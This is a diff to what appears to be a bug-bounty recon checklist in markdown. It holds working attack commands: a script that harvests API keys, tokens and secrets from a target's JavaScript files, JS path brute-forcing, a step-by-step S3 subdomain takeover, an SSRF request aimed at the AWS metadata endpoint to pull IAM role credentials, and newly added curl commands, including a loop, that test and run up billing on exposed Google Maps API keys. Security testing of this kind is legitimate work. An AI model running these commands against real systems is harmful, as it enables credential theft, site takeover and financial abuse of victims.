@@ -12,7 +12,7 @@ For Recon :
 	2. Use the command to grep the secrets, keys and tokens : 		```
 		cat js_files.txt | while read url; do curl -s $url >> all_javascript_dump.txt; done  
 		grep -iE "apikey|token|secret|authorization|bearer" all_javascript_dump.txt```
-[ ] - Bruteforce checking all JiS Files : `ffuf -w common.txt -u https://target.com/assets/js/FUZZ`
+[ ] - Bruteforce checking all JS Files : `ffuf -w common.txt -u https://target.com/assets/js/FUZZ`
 [ ] - Always check User Agent for for Logs, it may give RFi
 [ ] - Checking for 403 Forbidden : 
 	[ ] - **Adding headers** (like `X-Forwarded-For`, `X-Originating-IP`)
@@ -34,4 +34,13 @@ For Recon :
 	If this has happened this shows that, the origin S3 bucket was gone, but is still present as the CNAME of the target. Now we can own the bucket under our account using the command : `aws s3 mb s3://old-target-dev` . Create a simple HTML Page to host the website. Upload it using the command : ```aws s3 website s3://old-target-dev --index-document index.html
 	aws s3 cp index.html s3://old-target-dev/ --acl public-read```
 	Then to chain it with SSRF, we can use this command by making some changes into it  : `curl -X POST http://old-staging.target.com/api/render -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"}'`
-[ ] - 
+[ ] - API Keys
+	[ ] - Google Maps API Key Exposure Impact - 
+		[ ] - Check with this command if we get any response or not : `curl "https://maps.googleapis.com/maps/api/geocode/json?address=Delhi&key=<exposed-key>" `      
+		[ ] -  Check for High Billing Impact : 
+		```for i in {1..10}; do
+		curl "https://maps.googleapis.com/maps/api/geocode/json?address=New+York+$i&key=<exposed-apikey>"
+		done```
+		[ ] - Check for Directions API : `curl "https://maps.googleapis.com/maps/api/directions/json?origin=Delhi&destination=Mumbai&key=<exposed-apikey>"`
+		 [ ] - Check for DistanceMatrix API : `curl "https://maps.googleapis.com/maps/api/distancematrix/json?origins=Delhi&destinations=Bangalore&key=<exposed-apikey>"`
+		 [ ] - Check for Places API : `curl "https://maps.googleapis.com/maps/api/place/textsearch/json?query=restaurants+in+Goa&key=<exposed-apikey>"`
